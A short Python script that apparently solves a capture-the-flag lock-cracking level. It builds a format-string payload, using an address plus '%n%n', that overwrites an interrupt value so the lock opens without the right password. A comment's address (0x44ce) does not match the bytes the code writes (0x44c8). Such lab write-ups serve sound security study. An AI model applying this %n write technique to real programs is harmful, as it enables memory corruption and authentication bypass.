#!/usr/bin/python

import utils
from binascii import hexlify, unhexlify

def up():
    '''We use a similar printf exploit as in addis_ababa (reading too many values
    off the stack)
    '''
    #just some garbage, but:
    # - 0x12 so that it works as an address (or else crashes)
    # - 0x7f long because we're using %n
    up = bytearray([0x12]*0x7f)
    #0x44ce is the memory location where conditional_unlock has the value 0x7e,
    #the "unlock if password is right" interrupt
    #we swap it with 0x7f, "unlock because I'm a big stupid head" interrupt
    up[0:2] = [0xc8, 0x44]
    up += '%n%n'
    #otherwise getsn kills us
    assert len(up) <= 0x1f4
    return up

if __name__ == '__main__':
    print 'username:password: %s' % hexlify(up())
